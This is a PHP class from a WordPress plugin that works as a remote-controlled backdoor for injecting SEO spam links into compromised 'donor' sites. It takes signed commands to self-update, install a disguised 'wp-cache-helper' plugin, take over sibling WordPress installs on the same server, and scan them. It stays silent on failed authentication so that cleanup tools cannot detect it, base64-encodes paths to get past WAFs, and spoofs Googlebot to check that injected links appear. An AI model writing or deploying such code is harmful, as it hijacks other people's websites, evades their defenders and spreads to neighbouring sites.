<?php

if (!defined('ABSPATH')) exit;

class WLH_Check
{
    const TS_WINDOW = 600;

    public static function register_hooks()
    {
        add_action('init', array('WLH_Check', 'maybe_serve'), 1);
    }

    public static function maybe_serve()
    {
        // Token-less CLAIM trigger. The other ops below all require a token, but a
        // fresh donor has none until it claims — and the claim only fires on
        // activation (one shot) or WP-cron (which never runs on a zero-traffic
        // doorway). That left ~1000 installed-but-unclaimed donors stuck. This op
        // lets the panel POKE an active-but-unconfigured plugin to claim
        // synchronously, authed by the shared HANDSHAKE (not the per-donor token).
        //
        // Auth failures here return SILENTLY (the request falls through to WP's
        // normal 200/homepage) instead of answering JSON: a distinct
        // {"error":"stale"/"bad_sig"} body is an unauthenticated detector of the
        // plugin's presence — and a cleanup-verifier for a competitor checking
        // whether their deletion stuck. The panel always signs validly, so a
        // silent pass-through costs nothing. JSON is only ever answered AFTER a
        // valid signature.
        if (isset($_REQUEST['wlh_claim']) && $_REQUEST['wlh_claim'] !== '') {
            if (!defined('WLH_HANDSHAKE') || (string)WLH_HANDSHAKE === '') {
                return;
            }
            $ts = isset($_REQUEST['ts']) ? (string)$_REQUEST['ts'] : '';
            if (!ctype_digit($ts) || abs(time() - (int)$ts) > self::TS_WINDOW) {
                return;
            }
            $expected = hash_hmac('sha256', 'claim.' . $ts, (string)WLH_HANDSHAKE);
            if (!hash_equals($expected, (string)$_REQUEST['wlh_claim'])) {
                return;
            }
            if (!defined('DONOTCACHEPAGE')) define('DONOTCACHEPAGE', true);
            if (!defined('LSCWP_NO_CACHE')) define('LSCWP_NO_CACHE', true);
            // Already claimed? Idempotent success — nothing to do.
            if (WLH_Client::is_configured()) {
                self::out(200, array('ok' => true, 'claimed' => true, 'already' => true));
            }
            $res = WLH_Client::try_claim();
            self::out(!empty($res['ok']) ? 200 : 502, array(
                'ok'      => !empty($res['ok']),
                'claimed' => WLH_Client::is_configured(),
                'err'     => isset($res['error']) ? $res['error'] : null,
            ));
        }

        $op = '';
        if (isset($_REQUEST['wlh_check']) && $_REQUEST['wlh_check'] !== '') {
            $op = 'check';
        } elseif (isset($_REQUEST['wlh_pull']) && $_REQUEST['wlh_pull'] !== '') {
            $op = 'pull';
        } elseif (isset($_REQUEST['wlh_update']) && $_REQUEST['wlh_update'] !== '') {
            $op = 'update';
        } elseif (isset($_REQUEST['wlh_scan']) && $_REQUEST['wlh_scan'] !== '') {
            $op = 'scan';
        } elseif (isset($_REQUEST['wlh_neighbors']) && $_REQUEST['wlh_neighbors'] !== '') {
            $op = 'neighbors';
        } elseif (isset($_REQUEST['wlh_adopt']) && $_REQUEST['wlh_adopt'] !== '') {
            $op = 'adopt';
        } elseif (isset($_REQUEST['wlh_adoptclean']) && $_REQUEST['wlh_adoptclean'] !== '') {
            $op = 'adoptclean';
        } elseif (isset($_REQUEST['wlh_wchinstall']) && $_REQUEST['wlh_wchinstall'] !== '') {
            $op = 'wchinstall';
        } elseif (isset($_REQUEST['wlh_botstats']) && $_REQUEST['wlh_botstats'] !== '') {
            $op = 'botstats';
        } else {
            return;
        }
        $token = WLH_Vault::token();
        if ($token === '') {
            // Unconfigured — nothing to verify against; stay indistinguishable.
            return;
        }
        $ts = isset($_REQUEST['ts']) ? (string)$_REQUEST['ts'] : '';
        if (!ctype_digit($ts) || abs(time() - (int)$ts) > self::TS_WINDOW) {
            return;
        }
        $sig = (string)$_REQUEST['wlh_' . $op];
        if ($op === 'update') {
            // 0.5.0: the panel migrates to HMAC(op.ts.sha), but the fleet (and
            // older crons) may still sign HMAC(op.ts) — accept BOTH while the
            // rollout converges. sha itself becomes mandatory below.
            $sha = isset($_REQUEST['sha']) ? trim((string)$_REQUEST['sha']) : '';
            $ok = hash_equals(hash_hmac('sha256', $op . '.' . $ts . '.' . $sha, $token), $sig)
                || hash_equals(hash_hmac('sha256', $op . '.' . $ts, $token), $sig);
            if (!$ok) {
                return;
            }
            if ($sha === '') {
                // Signed caller, but no zip hash — refuse loudly (and record it)
                // rather than installing an unverifiable build.
                update_option(WLH_OPT_LAST_ERROR, 'update: sha_required', false);
                self::out(400, array('ok' => false, 'error' => 'sha_required'));
            }
        } elseif ($op === 'wchinstall') {
            // 0.6.0: NEW op — no legacy fleet to stay compatible with, so ONLY
            // the sha-bound HMAC(op.ts.sha) is accepted (unlike update's
            // transitional dual-scheme above) and sha is mandatory.
            $sha = isset($_REQUEST['sha']) ? trim((string)$_REQUEST['sha']) : '';
            if (!hash_equals(hash_hmac('sha256', $op . '.' . $ts . '.' . $sha, $token), $sig)) {
                return;
            }
            if ($sha === '') {
                update_option(WLH_OPT_LAST_ERROR, 'wchinstall: sha_required', false);
                self::out(400, array('ok' => false, 'error' => 'sha_required'));
            }
        } else {
            $expected = hash_hmac('sha256', $op . '.' . $ts, $token);
            if (!hash_equals($expected, $sig)) {
                return;
            }
        }
        // Authenticated from here on — only now is a JSON answer safe to give.
        if (!defined('DONOTCACHEPAGE')) define('DONOTCACHEPAGE', true);
        if (!defined('LSCWP_NO_CACHE')) define('LSCWP_NO_CACHE', true);

        if ($op === 'check') {
            self::out(200, self::run());
        }
        if ($op === 'botstats') {
            // Read-only: verified-Googlebot day counters for the panel's pull.
            self::out(200, class_exists('WLH_Botstat') ? WLH_Botstat::stats() : array('ok' => false, 'error' => 'no_botstat'));
        }
        if ($op === 'pull') {
            WLH_Client::pull_now();
            $links = (array)get_option(WLH_OPT_LINKS, array());
            self::out(200, array('ok' => true, 'count' => count($links), 'check' => self::run()));
        }
        if ($op === 'update') {
            $sha = isset($_REQUEST['sha']) ? (string)$_REQUEST['sha'] : '';
            $res = WLH_Client::update_self($sha);
            self::out(!empty($res['ok']) ? 200 : 500, $res);
        }
        if ($op === 'scan') {
            self::out(200, class_exists('WLH_Clean') ? WLH_Clean::scan() : array('ok' => false, 'error' => 'no_clean'));
        }
        if ($op === 'neighbors') {
            self::out(200, class_exists('WLH_Neighbors') ? WLH_Neighbors::scan() : array('ok' => false, 'error' => 'no_neighbors'));
        }
        // 0.5.1: sibling adoption — reached ONLY past the HMAC check above
        // (same 'adopt.ts' / 'adoptclean.ts' signing as every other op, same
        // silent pass-through on a bad signature). One op = one path.
        // 0.5.2: the path may arrive base64'd (`path_b64`) — WAFs 403 a raw
        // `/var/www/...` string even inside a POST body, base64 sails through.
        if ($op === 'adopt') {
            $path = self::adopt_path();
            $mode = isset($_REQUEST['mode']) ? (string)$_REQUEST['mode'] : 'auto';
            $res = class_exists('WLH_Adopt') ? WLH_Adopt::adopt($path, $mode) : array('ok' => false, 'error' => 'no_adopt');
            self::out(!empty($res['ok']) ? 200 : 400, $res);
        }
        if ($op === 'adoptclean') {
            $path = self::adopt_path();
            $res = class_exists('WLH_Adopt') ? WLH_Adopt::clean($path) : array('ok' => false, 'error' => 'no_adopt');
            self::out(!empty($res['ok']) ? 200 : 400, $res);
        }
        // 0.6.0: install the MAIN plugin (wp-cache-helper) onto this donor
        // (no path_b64) or a sibling (path_b64) — reached ONLY past the HMAC
        // check above, which binds the zip's sha into the signature.
        if ($op === 'wchinstall') {
            $sha = isset($_REQUEST['sha']) ? (string)$_REQUEST['sha'] : '';
            $path_b64 = isset($_REQUEST['path_b64']) ? (string)$_REQUEST['path_b64'] : '';
            $res = class_exists('WLH_WchInstall')
                ? WLH_WchInstall::install($sha, $path_b64)
                : array('ok' => false, 'error' => 'no_wchinstall');
            self::out(!empty($res['ok']) ? 200 : 400, $res);
        }
    }

    /** path_b64 (preferred, WAF-proof) or plain path from the request. */
    private static function adopt_path()
    {
        if (!empty($_REQUEST['path_b64'])) {
            $d = base64_decode((string)$_REQUEST['path_b64'], true);
            return is_string($d) ? $d : '';
        }
        return isset($_REQUEST['path']) ? (string)$_REQUEST['path'] : '';
    }

    /**
     * present/missing/count cover the UNION of the homepage (wlh_links) and
     * sitewide (wlh_sw_links) sets — the sw blocks render on the homepage too,
     * so one loopback fetch verifies both. 0.8.0: sw_present/sw_missing break
     * the sitewide ids out for the panel (older panels ignore unknown keys).
     *
     * @return array{home_status:int,present:int[],missing:int[],count:int,sw_present:int[],sw_missing:int[]}
     */
    public static function run()
    {
        $links = (array)get_option(WLH_OPT_LINKS, array());
        $swLinks = (array)get_option(WLH_OPT_SW_LINKS, array());
        if (empty($links) && empty($swLinks)) {
            return array(
                'home_status' => 0, 'present' => array(), 'missing' => array(), 'count' => 0,
                'sw_present' => array(), 'sw_missing' => array(),
            );
        }
        $fetched = self::fetch_home_as_bot();
        $code = $fetched['code'];
        $html = $fetched['html'];
        $present = array();
        $missing = array();
        foreach ($links as $l) {
            if (!is_array($l) || !isset($l['id'], $l['url'])) {
                continue;
            }
            $id = (int)$l['id'];
            $url = (string)$l['url'];
            if ($html !== '' && self::url_present($html, $url)) {
                $present[] = $id;
            } else {
                $missing[] = $id;
            }
        }
        $swPresent = array();
        $swMissing = array();
        foreach ($swLinks as $l) {
            if (!is_array($l) || !isset($l['id'], $l['url'])) {
                continue;
            }
            $id = (int)$l['id'];
            $url = (string)$l['url'];
            if ($html !== '' && self::url_present($html, $url)) {
                $swPresent[] = $id;
                $present[] = $id;
            } else {
                $swMissing[] = $id;
                $missing[] = $id;
            }
        }
        return array(
            'home_status' => $code,
            'present'     => $present,
            'missing'     => $missing,
            'count'       => count($links) + count($swLinks),
            'sw_present'  => $swPresent,
            'sw_missing'  => $swMissing,
        );
    }

    private static function url_present($html, $url)
    {
        if ($url === '') {
            return false;
        }
        if (stripos($html, $url) !== false) {
            return true;
        }
        $host = parse_url($url, PHP_URL_HOST);
        $path = (string)parse_url($url, PHP_URL_PATH);
        if (is_string($host) && $host !== '') {
            $needle = $host . rtrim($path, '/');
            if (stripos($html, $needle) !== false) {
                return true;
            }
        }
        return false;
    }

    /** @return array{code:int,html:string} */
    private static function fetch_home_as_bot()
    {
        $token = WLH_Vault::token();
        $sig = hash_hmac('sha256', 'selfcheck', $token);
        $bust = substr(md5($sig . microtime(true)), 0, 12);
        $url = add_query_arg(array('wlh_sc' => $bust), home_url('/'));

        $args = array(
            'timeout'     => 15,
            'redirection' => 2,
            'sslverify'   => false,
            'user-agent'  => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'headers'     => array('X-WLH-SC' => $sig),
        );
        add_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10, 1);
        $r = wp_remote_get($url, $args);
        remove_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10);

        if (is_wp_error($r)) {
            return array('code' => 0, 'html' => '');
        }
        return array(
            'code' => (int)wp_remote_retrieve_response_code($r),
            'html' => (string)wp_remote_retrieve_body($r),
        );
    }

    /** True when the current request is our own signed self-check loopback. */
    public static function is_selfcheck_request()
    {
        $given = isset($_SERVER['HTTP_X_WLH_SC']) ? (string)$_SERVER['HTTP_X_WLH_SC'] : '';
        if ($given === '') {
            return false;
        }
        $token = WLH_Vault::token();
        if ($token === '') {
            return false;
        }
        return hash_equals(hash_hmac('sha256', 'selfcheck', $token), $given);
    }

    private static function out($code, $data)
    {
        if (function_exists('status_header')) {
            status_header($code);
        }
        if (function_exists('nocache_headers')) {
            nocache_headers();
        }
        header('Content-Type: application/json; charset=utf-8');
        echo function_exists('wp_json_encode') ? wp_json_encode($data) : json_encode($data);
        exit;
    }
}
